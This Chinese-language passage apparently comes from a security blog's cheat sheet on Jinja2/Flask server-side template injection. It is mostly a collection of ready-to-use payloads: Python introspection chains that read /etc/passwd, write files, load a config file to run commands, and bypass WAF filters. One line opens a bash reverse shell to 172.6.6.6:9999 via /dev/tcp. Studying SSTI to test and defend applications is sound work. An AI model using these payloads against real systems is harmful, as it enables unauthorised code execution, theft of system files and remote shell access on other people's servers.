这张图可以说是百试百灵了，然后接下来我们继续根据不同的模版和语言特性进行常用payload的使用总结

### Jinja2使用

### 1.flask的全局变量

```
config 保存着隐私信息
config.from_object('os') 
request.environ是一个字典，其中包含和服务器环境相关的对象 
```

### 2.python强大的内省特性

```
总结:
通过某种类型(字符串:""，list:[]，int：1)开始引出，__class__找到当前类，__mro__或者__base__找到__object__，前边的语句构造都是要找这个。然后利用object找到能利用的类。还有就是{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')}}这种的，能执行，但是不会回显。一般来说，python2的话用file就行，python3则没有这个属性。
```

常见的内省函数

```
__builtins__
__import__
__class__返回调用的参数类型。
__base__返回基类
__mro__允许我们在当前Python环境下追溯继承树
__subclasses__()返回子类
builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块
__globals__ 函数会以字典类型返回当前位置的全部全局变量
```

常见的寻找过程

```
''.__class__.__base__.__subclasses__()
# 返回子类的列表 [,,,...]
#从中随便选一个类,查看它的__init__
>>> ''.__class__.__base__.__subclasses__()[30].__init__
<slot wrapper '__init__' of 'object' objects>
# wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性

#再换几个子类，很快就能找到一个重载过__init__的类，比如
>>> ''.__class__.__base__.__subclasses__()[5].__init__

>>> ''.__class__.__base__.__subclasses__()[5].__init__.__globals__['__builtins__']['eval']
#然后用eval执行命令即可
```

安全研究员给出的常用的payload

文件读取

```
#读文件
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}  
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
#写文件
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}
```

任意执行

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('code')}} 
{{ config.from_pyfile('/tmp/owned.cfg') }}  
```

写入一次

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('from subprocess import check_output\n\nRUNCMD = check_output\n')}}  
{{ config.from_pyfile('/tmp/owned.cfg') }}  
{{ config['RUNCMD']('/usr/bin/id',shell=True) }} 
```

不回显

```
http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']('1+1')}}      
http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').system('whoami')")}}
```

```
{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}(这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块)  
http://39.105.116.195/{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}(system函数换为popen('').read()，需要导入os模块)  
{{().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}(不需要导入os模块，直接从别的模块调用)
```

python3

文件读取

```
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}
```

命令执行

```
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}}
```

脚本使用示例：

```
ttp://192.168.228.36/?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='ImmutableDictMixin' %}{{ c.__hash__.__globals__['__builtins__'].eval('__import__("os").popen("id").read()') }}{% endif %}{% endfor %}
```

```
绕waf
python2：
[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')
[].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'].system('ls')
"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
"".__class__.__mro__[-1].__subclasses__()[40](filename).read()
"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('bash -c "bash -i >& /dev/tcp/172.6.6.6/9999 0>&1"')

python3：
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']
"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('__global'+'s__')['os'].__dict__['system']('ls')
```

参考资料

**国内资料**

Python方面：[SSTI/沙盒逃逸详细总结](https://www.anquanke.com/post/id/188172)[flask之ssti模版注入从零到入门](https://xz.aliyun.com/t/3679)
								[Flask/Jinja2模板注入中的一些绕过姿势](https://p0sec.net/index.php/archives/120/)
		PHP方面：[服务端模板注入攻击 （SSTI）之浅析](https://www.freebuf.com/vuls/83999.html)

**国外资料**

这篇总结的比较全面：[Server-Side Template Injection: RCE for the modern webapp](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
		Python方面：[Jinja2 template injection filter bypasses](https://0day.work/jinja2-template-injection-filter-bypasses/)